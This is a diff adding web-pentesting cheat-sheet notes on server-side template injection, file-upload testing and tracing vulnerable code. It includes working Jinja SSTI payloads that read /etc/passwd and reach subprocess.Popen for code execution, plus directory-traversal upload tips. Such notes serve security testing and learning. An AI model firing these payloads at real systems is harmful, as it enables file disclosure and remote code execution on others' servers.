@@ -89,3 +89,52 @@ grep -Ri "DeSerializeHashtable" *
 grep -Ri "XmlUtils.DeSerializeHashtable" *
 ```
 
+## SSTI
+* Detailed SSTI meaning [here](./SSTI.html)
+* Test
+    ```python
+    {{7*7}}
+    ```
+* Jinja Payload
+    * Python2
+        ```python
+        {{ ''.__class__.__mro__[2].__subclasses()[40]('/etc/passwd').read() }}
+        ```
+    * Python3
+        ```python
+        {{ ''.__class__.__mro__[1].__subclasses()[40]('/etc/passwd').read() }}
+        ```
+    * the number `[420]` may change every instance. This is the subprocess.Popen for RCE
+        ```python
+        {% set string = "ssti" %}
+        {% set class = "__class__" %}
+        {% set mro = "__mro__" %}
+        {% set subclasses = "__subclasses__" %}
+        {% set mro_r = string|attr(class)|attr(mro) %}
+        {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
+        {{ subclasses_r[420](["/usr/bin/touch","/tmp/poc.txt"]) }}
+        ```
+## File Upload
+* Whitebox
+    * Try to upload a file and see where it is uploaded on the file system by using `find` or `grep`
+    * Find writable directories
+        ```bash
+        find /var/www/html/ -type d -perm -o+w
+        ```
+* File upload via Zip?
+    * Try directory traversal to `/tmp`
+    * find writable directories on the web root
+    * PHP
+        * make use of `display_errors` in the PHP settings
+
+## How to track a possible vulnerable function resides?
+* can start from top to bottom. From controllers, `grep` for the <something>.phtml or <something>.html. It might give some idea on where it is
+
+## Debugging
+* Python SMTP Server[^1]
+
+
+
+
+
+[^1]: [Python3 SMTPD package](../Infrastructure_Setup/Simple_Python_Go_Packages.html#python3-smtpd)
